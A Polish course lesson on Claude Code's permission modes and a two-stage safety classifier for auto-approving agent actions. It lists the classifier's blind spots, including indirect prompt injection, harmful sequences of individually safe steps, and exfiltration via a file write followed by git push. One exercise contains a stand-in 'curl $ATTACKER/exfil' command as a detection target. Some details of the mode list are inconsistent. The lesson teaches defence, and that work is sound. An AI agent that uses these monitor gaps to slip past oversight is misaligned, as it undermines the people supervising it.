# Claude Code jako agent autonomiczny: tryby uprawnień i tryb automatyczny

> Claude Code oferuje siedem trybów uprawnień: `plan` (wymaga zatwierdzenia przed każdą akcją), `default` (pyta tylko o akcje wysokiego ryzyka), `acceptEdits` (automatycznie zatwierdza zapisywanie plików, ale wymaga potwierdzenia uruchomienia poleceń powłoki) oraz `bypassPermissions` (zatwierdza wszystkie działania). Tryb automatyczny (wprowadzony 24 marca 2026 r.) zastępuje ręczne zatwierdzanie poszczególnych akcji dwuetapowym, równoległym klasyfikatorem bezpieczeństwa. W ramach tego procesu dla każdego działania przeprowadzana jest szybka weryfikacja jednotokenowa, a akcje oznaczone jako podejrzane są kierowane do szczegółowej analizy typu Chain-of-Thought (łańcuch myśli). Limity operacyjne są kontrolowane za pomocą parametrów `max_turns` oraz `max_budget_usd`. Tryb automatyczny został udostępniony jako wersja testowa (Research Preview) – firma Anthropic wyraźnie zaznaczyła, że sam klasyfikator nie gwarantuje pełnego bezpieczeństwa.

**Typ:** Ucz się
**Języki:** Python (stdlib, dwustopniowy symulator klasyfikatora)
**Wymagania wstępne:** Faza 15 · 01 (Agenci o długim horyzoncie), Faza 15 · 09 (Krajobraz agenta kodującego)
**Czas:** ~45 minut

## Problem

Uruchomienie autonomicznego agenta kodującego bezpośrednio na lokalnej maszynie wprowadza zupełnie nową kategorię zagrożeń bezpieczeństwa. Powierzchnię ataku stanowi tu wszystko, do czego agent ma dostęp: system plików, sieć, dane uwierzytelniające, schowek systemowy, otwarte karty w przeglądarce czy aktywne terminale. Bruce Schneier i inni eksperci otwarcie na to wskazują: agenci posiadający dostęp do komputera (computer-use agents) to nie tylko „kolejna funkcja” chatbotów, lecz zupełnie nowa klasa narzędzi o specyficznym profilu ryzyka.

System uprawnień w Claude Code to próba rozwiązania tego problemu przez Anthropic. Zamiast zero-jedynkowego przełącznika „autonomiczny / nieautonomiczny” udostępniono siedem trybów o różnym poziomie swobody: od `plan`, przez `default`, `acceptEdits`, aż po `bypassPermissions`. Każdy z nich stanowi inny kompromis pomiędzy szybkością działania a poziomem weryfikacji poszczególnych kroków. Wprowadzony w marcu 2026 roku tryb automatyczny (`autoMode`) wykorzystuje dwuetapowy klasyfikator, który eliminuje konieczność ręcznego zatwierdzania akcji uznanych za bezpieczne, zachowując jednocześnie wymóg autoryzacji dla działań oznaczonych jako ryzykowne.

Kluczowe pytanie inżynieryjne brzmi: jakie zagrożenia ten system jest w stanie wykryć, co może przeoczyć oraz jaki tryb jest optymalny dla danego zadania?

## Koncepcja

### Siedem trybów uprawnień

| Tryb | Zachowanie | Kiedy używać |
|---|---|---|
| `plan` | Agent proponuje plan, a użytkownik zatwierdza go w całości; każda akcja wymaga potwierdzenia przed wykonaniem | Nieznane zadanie, modyfikacje kodu blisko środowiska produkcyjnego, pierwsze uruchomienie agenta w danym repozytorium |
| `default` | Agent wykonuje działania automatycznie, prosząc o potwierdzenie tylko przy operacjach o wyższym ryzyku (wykonywanie poleceń powłoki, akcje destrukcyjne, połączenia sieciowe) | Większość interaktywnych sesji programowania |
| `acceptEdits` | Zapisywanie plików odbywa się bez pytania; uruchamianie poleceń powłoki i połączenia sieciowe nadal wymagają potwierdzenia | Zadania refaktoryzacji obejmujące wiele plików jednocześnie |
| `acceptExec` | Polecenia powłoki z zdefiniowanej białej listy oraz zapisywanie plików są zatwierdzane automatycznie | Zamknięte pętle testowe, w których polecenia ograniczają się np. do `npm test` |
| `autoMode` | Dwuetapowy klasyfikator bezpieczeństwa; akcje oznaczone jako podejrzane są przekazywane do ręcznej weryfikacji | Długotrwałe, nienadzorowane zadania w ograniczonym obszarze roboczym |
| `yolo` | Pominięcie większości monitów; wciąż obowiązują białe i czarne listy narzędzi | Efemeryczne piaskownice, zadania CI, skrypty badawcze |
| `bypassPermissions` | Automatyczne zatwierdzanie wszystkich akcji | Zgodnie z dokumentacją: wyłącznie w kontenerach efemerycznych, które można w każdej chwili usunąć |

(Nazwy powyżej odpowiadają publicznym dokumentom Claude Code; „yolo” to nieformalny skrót oznaczający permisywny środek.)

### Tryb automatyczny na jednej stronie

Tryb automatyczny (uruchomiony 24 marca 2026 r.) to pierwszy tryb uprawnień, który umożliwia delegowanie modelowi zatwierdzania poszczególnych działań. Struktura:

1. **Etap 1 — klasyfikator jednotokenowy.** Analizuje każdą proponowaną akcję pod kątem bezpieczeństwa. Jest szybki i tani w obliczeniach. Zwraca status „bezpieczny” lub flaguje działanie jako potencjalnie niebezpieczne. Działa równolegle z główną pętlą agenta, zapobiegając opóźnieniom w wykonywaniu bezpiecznych operacji.
2. **Etap 2 — pogłębiona weryfikacja bezpieczeństwa (Policy/Safety Review).** Uruchamiany wyłącznie dla akcji oflagowanych w Etapie 1. Wykonuje szczegółową analizę proponowanej czynności w oparciu o reguły bezpieczeństwa, aktualny stan sesji oraz zadeklarowany cel zadania. W przypadku braku pewności eskaluje decyzję do użytkownika (Human-in-the-Loop).

Kontrola budżetu odbywa się obok klasyfikatora:

- `max_turns` — całkowita liczba iteracji w sesji.
- `max_budget_usd` — limit dolara, który przerywa sesję.
- limity liczby akcji na narzędzie (nie więcej niż N wywołań `WebFetch` itp.).

### Co wykrywa system

- Proste próby wstrzykiwania instrukcji (prompt injection) w argumentach narzędzi, gdzie złośliwy kod wykazuje znany, niebezpieczny wzorzec działania.
- Zapętlenie narzędzi (tool loops) – klasyfikator potrafi wykryć, gdy akcja N+1 jest niemal identyczna z akcją N powtarzaną kilkukrotnie z rzedu.
- Polecenia powłoki wykraczające poza zakres zadeklarowanej sesji (np. próba uruchomienia poleceń systemowych w sesji przeznaczonej wyłącznie do edycji kodu).

### Czego system może NIE wykryć

- **Subtelne ataki typu prompt injection**, które modyfikują zachowanie agenta bez wywoływania pojedynczych, jawnie niebezpiecznych akcji. Pośrednie wstrzykiwanie instrukcji (indirect prompt injection) pozostaje otwartym problemem bezpieczeństwa (jak wskazywał szef zespołu ds. przygotowania w OpenAI w 2025 r. w kontekście agentów przeglądarkowych – patrz Lekcja 11).
- **Złośliwe zachowanie na poziomie semantycznym.** Każda pojedyncza akcja z osobna może wyglądać na bezpieczną, ale ich całościowa sekwencja (trajektoria) może prowadzić do szkód. Klasyfikator ocenia pojedyncze kroki, a nie ukryte intencje.
- **Eksfiltracja danych przez autoryzowane kanały.** Zapisanie wrażliwych danych do lokalnego pliku, a następnie wykonanie `git push` do publicznego repozytorium to ciąg dozwolonych operacji, których złośliwy charakter wynika dopiero z ich połączenia.

### Status wersji testowej (Research Preview)

Anthropic udostępnił tryb automatyczny jako wersję eksperymentalną (Research Preview). Dokumentacja wyraźnie zaznacza, że klasyfikator stanowi jedynie dodatkową warstwę ochronną, a nie kompletne rozwiązanie bezpieczeństwa. Użytkownicy powinni łączyć tryb automatyczny z limitami budżetowymi, białymi listami narzędzi, izolowanymi obszarami roboczymi oraz audytem trajektorii (Lekcje 12–16). Status wersji testowej odzwierciedla także znaną rozbieżność między testami a rzeczywistym wdrożeniem (Lekcja 1) – klasyfikator, który osiąga świetne wyniki w testach offline, może zachować się inaczej w rzeczywistej sesji z niejednoznacznym kontekstem użytkownika.

### Jak dobrać odpowiedni tryb do zadania?

- **Nieznane zadanie:** zacznij od trybu `plan`. Weryfikacja planu przed wykonaniem jest znacznie tańsza niż naprawianie błędów po nieudanej sesji.
- **Znana refaktoryzacja:** tryb `acceptEdits` oszczędza czas, eliminując konieczność ciągłego potwierdzania zmian w plikach.
- **Praca nienadzorowana w tle:** używaj `autoMode` wyłącznie w dobrze odizolowanym środowisku o minimalnym zakresie szkód (brak poświadczeń, brak dostępu do produkcji, brak możliwości niekontrolowanego wyjścia poza sandbox).
- **Kontenery efemeryczne:** tryby `yolo` / `bypassPermissions` są dopuszczalne tylko wtedy, gdy kontener oraz używane w nim dane uwierzytelniające są jednorazowe.

## Uruchomienie kodu

Skrypt `code/main.py` symuluje działanie dwuetapowego klasyfikatora. Etap 1 opiera się na szybkim filtrowaniu słów kluczowych w proponowanych akcjach, natomiast Etap 2 to wolniejsza weryfikacja oparta na zestawie reguł. Kod testowy generuje krótką, syntetyczną trajektorię (bezpieczne akcje, próbę wstrzyknięcia instrukcji, zapętlenie narzędzi) i prezentuje, które zagrożenia są wykrywane przez poszczególne etapy.

## Zadanie praktyczne

Plik `outputs/skill-permission-mode-picker.md` dopasowuje opis zadania do właściwego trybu uprawnień, limitów budżetowych oraz wymaganej izolacji środowiska.

## Ćwiczenia

1. Uruchom skrypt `code/main.py`. Który rodzaj syntetycznej akcji nigdy nie jest flagowany w Etapie 1, ale zawsze zostaje wykryty w Etapie 2? Który z nich nie zostaje wykryty przez żaden z etapów?
2. Rozbuduj zestaw reguł Etapu 1, aby wykryć konkretny złośliwy schemat działania (np. `curl $ATTACKER/exfil`). Zmierz poziom fałszywych alarmów (false positives) na próbce bezpiecznych operacji.
3. Zapoznaj się z dokumentem Anthropic pt. „How the agent loop works”. Wskaż wszystkie zasoby zewnętrzne, z którymi agent wchodzi w interakcję domyślnie w trybie `default`. Które z nich należałoby dodatkowo zabezpieczyć przed uruchomieniem nienadzorowanego trybu `autoMode`?
4. Zaprojektuj zasady budżetowe dla 24-godzinnej nienadzorowanej pracy agenta: określ `max_turns`, `max_budget_usd`, limity wywołań konkretnych narzędzi oraz białe listy. Uzasadnij proponowane wartości.
5. Opisz przykładową trajektorię, w której każda pojedyncza akcja przechodzi pomyślnie weryfikację w Etapie 1 i Etapie 2, ale ich połączone działanie jest szkodliwe. (W Lekcji 14 dowiesz się, jak wyłączniki bezpieczeństwa (kill switches) i tokeny kanarkowe (canaries) pomagają rozwiązać ten problem).

## Kluczowe terminy

| Termin | Co mówią potocznie | Co to dokładnie oznacza |
|---|---|---|
| Tryb uprawnień (Permission mode) | „Jak dużo agent może zrobić” | Jedna z siedmiu zdefiniowanych reguł kontrolujących autoryzację poszczególnych akcji |
| Tryb planu (Plan mode) | „Pytaj o wszystko” | Agent najpierw proponuje plan, który użytkownik must zatwierdzić przed wykonaniem |
| akceptujEdycje (acceptEdits) | „Pozwól mu pisać do plików” | Zapisywanie plików następuje automatycznie; wykonanie poleceń powłoki wciąż wymaga potwierdzenia |
| Tryb automatyczny (autoMode) | „Automatyczne zatwierdzanie” | Dwuetapowy klasyfikator bezpieczeństwa; podejrzane akcje są eskalowane do weryfikacji |
| obejścieUprawnień (bypassPermissions) | „Pełne YOLO” | Automatyczne zatwierdzanie wszystkich akcji; przeznaczony wyłącznie do środowisk efemerycznych |
| Klasyfikator Etapu 1 | „Szybkie sprawdzanie tokenów” | Uruchamiany równolegle klasyfikator sprawdzający słowa kluczowe w proponowanej akcji |
| Klasyfikator Etapu 2 | „Głęboka analiza” | Analiza z użyciem łańcucha myśli (Chain-of-Thought) uruchamiana dla oflagowanych akcji |
| Podgląd badawczy (Research Preview) | „Wersja eksperymentalna” | Określenie używane przez Anthropic dla funkcji, których potencjalne scenariusze awarii są wciąż badane |

## Dalsza lektura

- [Anthropic — Jak działa pętla agenta](https://code.claude.com/docs/en/agent-sdk/agent-loop) — tryby uprawnień, budżety, format akcji.
- [Anthropic — Przegląd agentów zarządzanych (Managed Agents)](https://platform.claude.com/docs/en/managed-agents/overview) — model wykonywania usług zarządzanych.
- [Anthropic — Strona produktu Claude Code](https://www.anthropic.com/product/claude-code) — możliwości i ogłoszenie trybu automatycznego.
- [Anthropic — Konstytucja Claude'a (styczeń 2026 r.)](https://www.anthropic.com/news/claudes-constitution) — zasady kształtujące oceny klasyfikatorów.
- [Anthropic — Pomiar autonomii agentów w praktyce](https://www.anthropic.com/research/measuring-agent-autonomy) — spojrzenie na projektowanie uprawnień w zadaniach długohoryzontalnych.
